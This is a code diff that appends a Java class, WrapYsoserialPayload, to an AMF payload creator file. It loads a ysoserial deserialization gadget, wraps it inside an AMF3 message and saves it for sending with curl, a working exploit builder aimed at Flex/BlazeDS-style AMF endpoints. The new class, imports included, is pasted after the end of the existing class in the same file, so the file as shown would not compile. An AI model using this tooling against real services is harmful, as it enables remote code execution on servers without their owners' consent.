@@ -199,3 +199,71 @@ public class SimpleAmfPayloadCreator {
         }
     }
 }
+
+
+
+
+
+import flex.messaging.io.SerializationContext;
+import flex.messaging.io.amf.ASObject;
+import flex.messaging.io.amf.Amf3Output;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+
+public class WrapYsoserialPayload {
+
+    public static void main(String[] args) {
+        try {
+            // Load the ysoserial payload
+            byte[] ysoserialPayload;
+            try (FileInputStream fis = new FileInputStream("ysoserial_payload.bin");
+                 ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
+                byte[] buffer = new byte[1024];
+                int bytesRead;
+                while ((bytesRead = fis.read(buffer)) != -1) {
+                    bos.write(buffer, 0, bytesRead);
+                }
+                ysoserialPayload = bos.toByteArray();
+            }
+
+            // Deserialize the ysoserial payload
+            ByteArrayInputStream bais = new ByteArrayInputStream(ysoserialPayload);
+            ObjectInputStream ois = new ObjectInputStream(bais);
+            Object deserializedPayload = ois.readObject();
+
+            // Create the AMF message
+            ASObject aso = new ASObject();
+            aso.put("operation", "echo");
+            aso.put("parameter", deserializedPayload);  // Embed the ysoserial payload
+
+            // Create and initialize the SerializationContext
+            SerializationContext context = new SerializationContext();
+            context.createASObjectForMissingType = true; // Default value
+            context.supportDatesByReference = false;
+
+            // Serialize the AMF message
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            Amf3Output amf3Output = new Amf3Output(context);
+            amf3Output.setOutputStream(baos);
+            amf3Output.writeObject(aso);
+
+            byte[] amfMessage = baos.toByteArray();
+
+            // Save to a file for later use with curl
+            try (FileOutputStream fos = new FileOutputStream("simpleAmfMessage.bin")) {
+                fos.write(amfMessage);
+            }
+
+            System.out.println("AMF message serialized successfully to simpleAmfMessage.bin");
+
+        } catch (IOException | ClassNotFoundException e) {
+            e.printStackTrace();
+        }
+    }
+}
+
